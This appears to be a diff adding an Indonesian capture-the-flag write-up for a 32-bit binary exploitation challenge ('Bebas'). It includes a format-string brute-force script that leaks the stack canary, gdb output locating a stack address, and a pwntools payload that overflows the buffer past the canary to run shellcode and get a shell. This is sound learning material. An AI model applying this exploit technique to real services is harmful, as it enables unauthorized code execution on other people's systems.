@@ -490,6 +490,167 @@ GamaCTF{Ini_Bukan_Flagnya}
 ### Flag
 ```GamaCTF{Ini_Bukan_Flagnya}```
 
+## Bebas
+Diberikan file `bebas.zip` yang didalamnya terdapat file binary elf 32bit yang executable.
+```sh
+$ file soal 
+soal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1e0fd5399de0053521ffb91126a380a5ccfa1255, not stripped
+```
+
+Binary ini membutuhkan 2 inputan client, yaitu nama dan alamat yang dimana keduanya memiliki bug `format string` dan `buffer overflow` karena inputan menggunakan fungsi `gets`.
+
+```py
+$ ./soal 
+Selamat Datang di Co-Jek
+Masukan Nama Anda:
+>> %p|%p|%p
+Hai 0x8048803|0xffa27e8a|0x80486a8!
+Masukan alamat : 
+>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Pesanan akan segera diantar!
+*** stack smashing detected ***: <unknown> terminated
+Aborted (core dumped)
+```
+
+Tetapi buffer overflow disini dapat dilakukan harus dengan me-leak value dari canary dulu, karena canary dalam binary ini hidup.
+
+```sh
+abdullahnz@zeroday ~/CTF/AsgamaCTF/PWN/bebas checksec ./soal
+[*] '/home/abdullahnz/CTF/AsgamaCTF/PWN/bebas/soal'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+Ada 2 cara untuk mengeksploit binary ini, yaitu:
+   1. Ret2libc.
+   2. Write shellcode pada stack.
+
+### Exploit
+Berikut flow exploit dan pembuatan payload yang dilakukan.
+   1. Leak canary dengan memanfaatkan bug `format string` pada input pertama.
+   2. Leak address stack pada inputan kedua juga dengan memanfaatkan bug `format string` pada input pertama.
+   3. Padding sebesar 0x136 ditambah dengan nilai canary.
+   4. Return address ke alamat shellcode dimulai.
+   5. Shellcode.
+
+```py
+   ...
+   0x804866e <main+38>: mov    DWORD PTR [ebp-0xc],eax
+=> 0x8048671 <main+41>: xor    eax,eax
+   0x8048673 <main+43>: call   0x80485e6 <init>
+   ...
+
+0x08048671 in main ()
+gdb-peda$ i r $eax
+eax            0x406e700        0x406e700
+```
+
+Canary memiliki nullbyte. Cari value canary dengan brute offset canary dan cari yang memiliki nullbyte diakhir dan debug binary untuk memastikan itu adalah nilai canary.
+
+```sh
+$ python brute.py | grep 00!
+63 0xf7fb1000!
+67 0xf9dd3600!
+72 0xf7ef2000!
+73 0xf7f80000!
+```
+
+File `brute.py`:
+```py
+#!/usr/bin/python
+
+from pwn import *
+
+context.log_level = 'warn'
+
+def exploit():
+    for i in range(80):
+        p = process('./soal')
+        payload = "%{}$p".format(i)
+        p.sendlineafter(">> ", payload)
+        p.recvuntil("Hai ")
+        print i, p.recvline()
+if __name__ == '__main__':
+    exploit()
+```
+
+Ada beberapa output yang memiliki nullbyte diakhir, coba debug binary leak pada offset 63.
+
+```py
+Legend: code, data, rodata, value
+0x08048671 in main ()
+gdb-peda$ i r $eax
+eax            0xb376ff00       0xb376ff00
+```
+Canary adalah 0xb376ff00, continue dengan command `c` dan masukkan nama "%63$p".
+```py
+gdb-peda$ c
+Continuing.
+Selamat Datang di Co-Jek
+Masukan Nama Anda:
+>> %63$p
+Hai 0xf7ffd000!
+...
+```
+Hmm, ternyata offset 63 bukan merupakan canary. Lakukan pada offset berikutnya tadi dengan cara seperti diatas, dan ditemukan canary pada offset ke-67.
+
+```py
+0x08048671 in main ()
+gdb-peda$ i r $eax
+eax            0xb1b3b000       0xb1b3b000
+gdb-peda$ c
+Continuing.
+Selamat Datang di Co-Jek
+Masukan Nama Anda:
+>> %67$p
+Hai 0xb1b3b000!
+Masukan alamat : 
+```
+
+Selajutnya adalah mencari address stack. Dari semua offset, saya menggunakan offset 2.
+
+```py
+0x080486cc in main ()                                                                     
+gdb-peda$ ni                                                                
+Hai 0xd1ea3200||0xffffcd1a! 
+   ...
+   0x80486f0 <main+168>:        call   0x8048460 <gets@plt>
+=> 0x80486f5 <main+173>:        add    esp,0x10
+   0x80486f8 <main+176>:        sub    esp,0xc
+   ...
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcca0 --> 0xffffccb6 ("AAAABBBBCCCC")
+...
+gdb-peda$ p 0xffffcd1a-0xffffccb6
+$1 = 0x64
+
+```
+
+Alamat yang bocor pada offset 2 adalah `0xffffcd1a`, sementara alamat stack adalah `0xffffccb6`. Selisih/jarak alamat pada offset 2 dan alamat stack adalah `0x64`. Maka untuk mendapatkan alamat stack, leak pada offset 2 lalu kurangi `0x64`.
+
+![Output](images/asgama_5.png)
+
+Selanjutnya dilakukan pembuatan payload. Flow paylaod: `padding + canary + return address ke alamat stack 2 kali + shellcode`.
+
+```py 
+   payload = b''.join([    
+      "A"*(0x136),
+      p32(canary),
+      p32(stack_address+0x136+12),
+      p32(stack_address+0x136+12),
+      asm(shellcraft.sh())
+   ])
+```
+
+Run exploit dan didapatkan shell.
+
+![Shell](images/asgama_5s.png)
+
+
 ## Notes
 Sebagian solver diatas dibuat dengan bantuan dari pwntools yang bisa didownload [disini](https://github.com/Gallopsled/pwntools).
 
